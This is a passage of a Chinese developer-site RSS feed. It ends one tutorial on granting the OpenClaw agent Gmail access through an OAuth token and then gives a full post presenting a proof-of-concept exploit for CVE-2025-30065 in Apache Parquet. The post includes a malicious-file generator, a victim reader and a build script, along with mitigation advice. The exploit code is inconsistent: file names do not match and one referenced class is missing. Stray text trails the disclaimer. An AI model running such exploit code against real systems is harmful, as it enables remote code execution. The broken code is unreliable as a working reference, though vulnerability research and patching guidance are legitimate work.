3. 然后下载/复制我这段脚本（我服务器里已经准备好了同名脚本，你也可以让我发你文本），保存为 gmail_token_from_desktop.js，再运行：
node gmail_token_from_desktop.js ./client_secret.json
它会弹浏览器让你登录授权，成功后会生成 gmail_token.json。

4. 把生成的 gmail_token.json 发回给我（文件形式）。
我拿到 token 后会做什么

• 在服务器上启用定时任务：每 3 小时检查 is:unread category:primary
• 有新邮件就给你发 Telegram 摘要（标题/发件人/时间/摘要）
• 然后把这些邮件标记为已读（避免重复推送）
顺带一句：你刚发的 client_secret 属于敏感信息，但它单独不能直接读你邮箱；真要停用也很简单——去 Google 账号里撤销第三方授权即可。

你把 gmail_token.json 发我就可以开跑了。
</code></pre>
<p>下面是具体设置步骤（以下操作在本机完成，不是在服务器上）：</p>
<ol>
<li>新建一个文件夹，把 <code>client_secret_*.json</code> 拖进去并改名为 <code>client_secret.json</code>（如不放心可先备份）</li>
<li>在该文件夹内执行下面 2 个命令：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">npm init -y
npm i googleapis @google-cloud/local-auth
</code></pre>
<ol start="3">
<li>创建一个名为 <code>gmail_token_from_desktop.js</code> 的文件，内容如下：</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);
<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);
<span class="hljs-keyword">const</span> { authenticate } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'@google-cloud/local-auth'</span>);
<span class="hljs-keyword">const</span> { google } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'googleapis'</span>);

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SCOPES</span> = [<span class="hljs-string">'https://www.googleapis.com/auth/gmail.modify'</span>];

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> clientPath = process.<span class="hljs-property">argv</span>[<span class="hljs-number">2</span>];
  <span class="hljs-keyword">if</span> (!clientPath) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Usage: node gmail_token_from_desktop.js ./client_secret.json'</span>);
    process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>);
  }

  <span class="hljs-keyword">const</span> auth = <span class="hljs-keyword">await</span> <span class="hljs-title function_">authenticate</span>({
    <span class="hljs-attr">keyfilePath</span>: path.<span class="hljs-title function_">resolve</span>(clientPath),
    <span class="hljs-attr">scopes</span>: <span class="hljs-variable constant_">SCOPES</span>,
  });

  <span class="hljs-keyword">const</span> tokenPath = path.<span class="hljs-title function_">join</span>(process.<span class="hljs-title function_">cwd</span>(), <span class="hljs-string">'gmail_token.json'</span>);
  fs.<span class="hljs-title function_">writeFileSync</span>(tokenPath, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(auth.<span class="hljs-property">credentials</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>));
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Saved token to:'</span>, tokenPath);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Scopes:'</span>, <span class="hljs-variable constant_">SCOPES</span>.<span class="hljs-title function_">join</span>(<span class="hljs-string">' '</span>));
}

<span class="hljs-title function_">main</span>().<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
  process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>);
});
</code></pre>
<ol start="4">
<li>运行命令后浏览器会打开并进入 Google 授权。如果授权失败出现 <code>Access blocked: ... has not completed the Google verification process (403)</code>，说明未把自己的邮箱添加到测试用户中，解决办法参考<a href="#oauth-consent-screen" title="#oauth-consent-screen">上面第 5 步</a>。</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">node gmail_token_from_desktop.js ./client_secret.json
</code></pre>
<ol start="5">
<li>生成 <code>gmail_token.json</code> 后发送给 OpenClaw</li>
</ol>
<figure class="my-6">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff51eddbc52e4118a67abe22f58ce186~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=wwW4cbCHTmgEkomn69%2B2b%2Fy6Wgw%3D" alt="发送gmail_token" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    发送gmail_token
  </figcaption>
</figure>
<p>看到这里 Gmail 就已经授权成功给 OpenClaw。</p>
<p>现在我们可以测试一下，比如发送：<strong>帮忙总结一下最近的邮件</strong>。</p>
<p>可以得到回复：</p>
<figure class="my-6">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01c8e4c8cad943b7a03d2d16ca942bdf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770701033&amp;x-signature=UkcIRXrWo%2BH7AsexEIzBblZu1Bg%3D" alt="OpenClaw Email Summary" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    OpenClaw Email Summary
  </figcaption>
</figure>
<p>说明 OpenClaw 已经可以读取你的邮件了。</p>
<h4 data-id="heading-6">每天按时总结</h4>
<p>如果想每天定时让 OpenClaw 帮你总结邮件，可以告诉它：<strong>每天早上 9:00 帮忙总结重要邮件的摘要</strong>。这样每天早上 9 点它会按时执行并总结。</p>
<h3 data-id="heading-7">实时邮件处理发布/订阅（可选，这里不做演示）</h3>
<p>配置如下（编辑 <code>~/.openclaw/openclaw.json</code>）：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"hooks"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"gmail"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"topic"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"your-pubsub-topic"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"subscription"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"your-subscription-name"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-8">总结</h2>
<p>到这里，OpenClaw 集成 Gmail 的设置就完成了。后续你可以继续扩展更多规则（如指定发件人、关键字过滤、自动标签等）。如果有任何问题或想法，欢迎在评论区留言交流。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Apache Parquet Avro反序列化漏洞POC：CVE-2025-30065]]></title>    <link>https://juejin.cn/post/7602177588443299859</link>    <guid>https://juejin.cn/post/7602177588443299859</guid>    <pubDate>2026-02-03T05:32:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602177588443299859" data-draft-id="7602191709388832810" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Apache Parquet Avro反序列化漏洞POC：CVE-2025-30065"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2026-02-03T05:32:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Apache Parquet Avro反序列化漏洞POC：CVE-2025-30065
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:32:28.000Z" title="Tue Feb 03 2026 05:32:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Apache Parquet Avro反序列化漏洞POC：CVE-2025-30065</h2>
<h4 data-id="heading-1">⚠️ 风险概述</h4>
<ul>
<li><strong>严重性</strong>：CVSS评分 <strong>10.0（严重☠️）</strong>。</li>
<li><strong>攻击方式</strong>：攻击者可构造恶意Parquet文件，其嵌入的Avro模式旨在触发任意Java类的实例化。</li>
<li><strong>后果</strong>：在特定条件下，可导致<strong>远程代码执行（RCE）</strong>。</li>
</ul>
<h3 data-id="heading-2">功能特性</h3>
<p>本POC项目完整演示了CVE-2025-30065漏洞的利用链：</p>
<ul>
<li><strong>恶意文件生成</strong>：<code>ParquetExploitGenerator</code> 类创建包含恶意Avro模式的Parquet文件。</li>
<li><strong>漏洞触发模拟</strong>：<code>ParquetVictim</code> 类模拟受害者应用程序读取恶意Parquet文件。</li>
<li><strong>依赖管理自动化</strong>：通过Shell脚本自动处理Maven依赖解析与项目编译。</li>
<li><strong>跨平台payload（历史参考）</strong>：<code>PayloadRecord</code> 类展示了静态初始化块中的命令执行逻辑（在新版POC中已被更隐蔽的类实例化逻辑覆盖）。</li>
</ul>
<h3 data-id="heading-3">安装指南</h3>
<h4 data-id="heading-4">前置要求</h4>
<ul>
<li>Java 8+</li>
<li>Maven</li>
</ul>
<h4 data-id="heading-5">安装步骤</h4>
<p>项目提供了自动化构建脚本 <code>CVE-2025-30065.sh</code>。</p>
<ol>
<li>确保脚本具有可执行权限：
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">chmod</span> +x CVE-2025-30065.sh
</code></pre>
</li>
<li>运行脚本，它将自动解析依赖、编译所有Java文件并执行完整的POC链条：
<pre><code class="hljs language-bash" lang="bash">./CVE-2025-30065.sh
</code></pre>
</li>
</ol>
<h3 data-id="heading-6">使用说明</h3>
<p>运行自动化脚本后，将按顺序执行以下操作：</p>
<ol>
<li><strong>生成恶意Parquet文件</strong>：使用 <code>ParquetExploitGenerator</code> 创建一个名为 <code>exploit-jeditorpane.parquet</code> 的文件，其Avro模式的默认值字段被精心构造为实例化 <code>javax.swing.JEditorPane</code> 类。</li>
<li><strong>模拟受害者读取</strong>：<code>ParquetVictim</code> 应用程序读取该文件，在反序列化Avro模式并处理默认值时触发目标类的实例化。</li>
</ol>
<h4 data-id="heading-7">基础工作流程</h4>
<p>整个漏洞利用的核心流程封装在Shell脚本中，其逻辑如下：</p>
<ol>
<li>使用Maven解析项目依赖并生成类路径文件。</li>
<li>编译所有必要的Java源代码。</li>
<li>运行漏洞生成器创建恶意文件。</li>
<li>运行受害者程序触发漏洞。</li>
</ol>
<h3 data-id="heading-8">核心代码</h3>
<h4 data-id="heading-9">1. 恶意Parquet文件生成器 (<code>ParquetExploitGenerator.java</code>)</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@author</span> Blackash
 * <span class="hljs-doctag">@version</span> 1.3
 * <span class="hljs-doctag">@license</span> For authorized security research and educational purposes only.
 *
 * Generates a Parquet file with a crafted Avro schema to demonstrate CVE-2025-30065,
 * aligned with the vulnerability logic observed in the official Apache patch.
 *
 * This version avoids using custom classes and instead leverages a standard Java class
 * (javax.swing.JEditorPane) known to exhibit side effects when deserialized.
 *
 */</span>
<span class="hljs-keyword">import</span> org.apache.avro.Schema;
<span class="hljs-keyword">import</span> org.apache.hadoop.conf.Configuration;
<span class="hljs-keyword">import</span> org.apache.hadoop.fs.Path;
<span class="hljs-keyword">import</span> org.apache.parquet.avro.AvroParquetWriter;
<span class="hljs-keyword">import</span> org.apache.parquet.hadoop.ParquetWriter;

<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParquetExploitGenerator</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// 默认输出文件名为 exploit-jeditorpane.parquet</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">outputFile</span> <span class="hljs-operator">=</span> args.length &gt; <span class="hljs-number">0</span> ? args[<span class="hljs-number">0</span>] : <span class="hljs-string">"exploit-jeditorpane.parquet"</span>;
        <span class="hljs-comment">// 恶意Avro模式定义：其‘trigger’字段的类型被设置为‘javax.swing.JEditorPane’记录</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">maliciousSchema</span> <span class="hljs-operator">=</span> <span class="hljs-string">"{"</span>
            + <span class="hljs-string">"\"type\": \"record\","</span> 
            + <span class="hljs-string">"\"name\": \"ExploitRecord\","</span> 
            + <span class="hljs-string">"\"fields\": ["</span>
            + <span class="hljs-string">"  {\"name\": \"trigger\","</span> 
            + <span class="hljs-string">"   \"type\": {\"type\": \"record\", \"name\": \"javax.swing.JEditorPane\", \"fields\": []},"</span>
            + <span class="hljs-string">"   \"default\": {}"</span> <span class="hljs-comment">// 默认值为空对象，触发目标类实例化</span>
            + <span class="hljs-string">"  }"</span>
            + <span class="hljs-string">"]"</span>
            + <span class="hljs-string">"}"</span>;
        <span class="hljs-comment">// 解析模式</span>
        <span class="hljs-type">Schema</span> <span class="hljs-variable">schema</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Schema</span>.Parser().parse(maliciousSchema);
        <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Path</span>(outputFile);
        <span class="hljs-type">Configuration</span> <span class="hljs-variable">conf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>();
        <span class="hljs-comment">// 使用AvroParquetWriter写入文件</span>
        <span class="hljs-keyword">try</span> (ParquetWriter&lt;Object&gt; writer = AvroParquetWriter.builder(path)
                .withSchema(schema)
                .withConf(conf)
                .build()) {
            writer.write(<span class="hljs-literal">null</span>);
        }
        System.out.println(<span class="hljs-string">"[+] Malicious Parquet file generated: "</span> + outputFile);
        System.out.println(<span class="hljs-string">"[!] Schema instantiates javax.swing.JEditorPane via default value."</span>);
    }
}
</code></pre>
<h4 data-id="heading-10">2. 受害者应用程序 (<code>ParquetVictim.java</code>)</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> victim;

<span class="hljs-keyword">import</span> org.apache.avro.generic.GenericRecord;
<span class="hljs-keyword">import</span> org.apache.parquet.avro.AvroParquetReader;
<span class="hljs-keyword">import</span> org.apache.parquet.hadoop.ParquetReader;
<span class="hljs-keyword">import</span> org.apache.hadoop.conf.Configuration;
<span class="hljs-keyword">import</span> org.apache.hadoop.fs.Path;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParquetVictim</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 读取恶意Parquet文件</span>
        <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Path</span>(<span class="hljs-string">"exploit.parquet"</span>);
        ParquetReader&lt;GenericRecord&gt; reader = AvroParquetReader.&lt;GenericRecord&gt;builder(path)
            .withConf(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>())
            .build();
        <span class="hljs-comment">// 读取记录，此操作会触发Avro模式中默认值的反序列化，从而实例化恶意类</span>
        <span class="hljs-type">GenericRecord</span> <span class="hljs-variable">record</span> <span class="hljs-operator">=</span> reader.read();
        System.out.println(<span class="hljs-string">"Record loaded: "</span> + record); <span class="hljs-comment">// this triggers instantiation of default</span>
    }
}
</code></pre>
<h4 data-id="heading-11">3. 自动化构建与执行脚本 (<code>CVE-2025-30065.sh</code>)</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
BASE_DIR=$(<span class="hljs-built_in">pwd</span>)
BUILD_DIR=<span class="hljs-string">"<span class="hljs-variable">$BASE_DIR</span>/build/classes"</span>
CP_FILE=<span class="hljs-string">"<span class="hljs-variable">$BASE_DIR</span>/cp.txt"</span>
JAR_DEPS=<span class="hljs-string">""</span>
<span class="hljs-comment"># 检查Maven并解析依赖</span>
<span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v mvn &amp;&gt; /dev/null; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"[+] Resolving dependencies with Maven..."</span>
    mvn dependency:build-classpath -Dmdep.outputFile=cp.txt &gt; /dev/null
    <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">"<span class="hljs-variable">$CP_FILE</span>"</span> ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"[-] Failed to generate classpath (cp.txt)."</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
    JAR_DEPS=$(<span class="hljs-built_in">cat</span> <span class="hljs-string">"<span class="hljs-variable">$CP_FILE</span>"</span>)
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"[-] Maven not found. Please install Maven and run again."</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>
<span class="hljs-comment"># 创建构建目录</span>
<span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">"<span class="hljs-variable">$BUILD_DIR</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"[+] Compiling PayloadRecord.java..."</span>
javac -d <span class="hljs-string">"<span class="hljs-variable">$BUILD_DIR</span>"</span> PayloadRecord.java || <span class="hljs-built_in">exit</span> 1
<span class="hljs-built_in">echo</span> <span class="hljs-string">"[+] Compiling ParquetExploitGenerator..."</span>
javac -<span class="hljs-built_in">cp</span> <span class="hljs-string">".:<span class="hljs-variable">$BUILD_DIR</span>:<span class="hljs-variable">$JAR_DEPS</span>"</span> -d <span class="hljs-string">"<span class="hljs-variable">$BUILD_DIR</span>"</span> POC-CVE-2025-30065-ParquetExploitGenerator.java || <span class="hljs-built_in">exit</span> 1
<span class="hljs-built_in">echo</span> <span class="hljs-string">"[+] Running exploit generator..."</span>
java -<span class="hljs-built_in">cp</span> <span class="hljs-string">".:<span class="hljs-variable">$BUILD_DIR</span>:<span class="hljs-variable">$JAR_DEPS</span>"</span> POC-CVE-2025-30065-ParquetExploitGenerator || <span class="hljs-built_in">exit</span> 1
<span class="hljs-built_in">echo</span> <span class="hljs-string">"[+] Compiling ParquetVictim.java..."</span>
javac -<span class="hljs-built_in">cp</span> <span class="hljs-string">".:<span class="hljs-variable">$BUILD_DIR</span>:<span class="hljs-variable">$JAR_DEPS</span>"</span> -d <span class="hljs-string">"<span class="hljs-variable">$BUILD_DIR</span>"</span> ParquetVictim.java || <span class="hljs-built_in">exit</span> 1
<span class="hljs-built_in">echo</span> <span class="hljs-string">"[+] Running victim (payload should trigger)..."</span>
java -<span class="hljs-built_in">cp</span> <span class="hljs-string">".:<span class="hljs-variable">$BUILD_DIR</span>:<span class="hljs-variable">$JAR_DEPS</span>"</span> ParquetVictim
</code></pre>
<h3 data-id="heading-12">安全建议与缓解措施</h3>
<ol>
<li><strong>立即更新</strong>：将 Apache Parquet Java 库升级至 <strong>1.15.1 或更高版本</strong>。</li>
<li><strong>启用类允许列表</strong>：
<ul>
<li>配置 <code>org.apache.parquet.avro.SERIALIZABLE_PACKAGES</code>，仅允许受信任的包（避免使用 <code>*</code>）。</li>
<li>使用 <code>org.apache.avro.TRUSTED_PACKAGES</code> 来限制Avro模式行为。</li>
</ul>
</li>
<li><strong>来源控制</strong>：避免处理来自不可信来源的Parquet文件，或对文件进行安全扫描。</li>
</ol>
<h3 data-id="heading-13">免责声明</h3>
<blockquote>
<p>本项目内容仅供<strong>教育研究及安全意识提升</strong>之目的，旨在揭示Apache Parquet中<strong>CVE-2025-30065</strong>安全漏洞的原理。<strong>任何信息均不鼓励或支持恶意活动、未经授权的系统访问或漏洞利用</strong>。
请确保您拥有测试目标系统的授权，并遵循负责任的披露流程及法律边界。作者不对信息的任何误用负责。FINISHED
6HFtX5dABrKlqXeO5PUv/84SoIo+TE3firf/5vX8AZ4lCdOI9nDKouWcoabNKkPM</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android中compose框架应用实践]]></title>    <link>https://juejin.cn/post/7602176198874857515</link>    <guid>https://juejin.cn/post/7602176198874857515</guid>    <pubDate>2026-02-03T05:38:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602176198874857515" data-draft-id="7602252722372689971" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android中compose框架应用实践"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-03T05:38:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="岸芷漫步"/> <meta itemprop="url" content="https://juejin.cn/user/2294042692432848"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android中compose框架应用实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2294042692432848/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    岸芷漫步
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:38:50.000Z" title="Tue Feb 03 2026 05:38:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
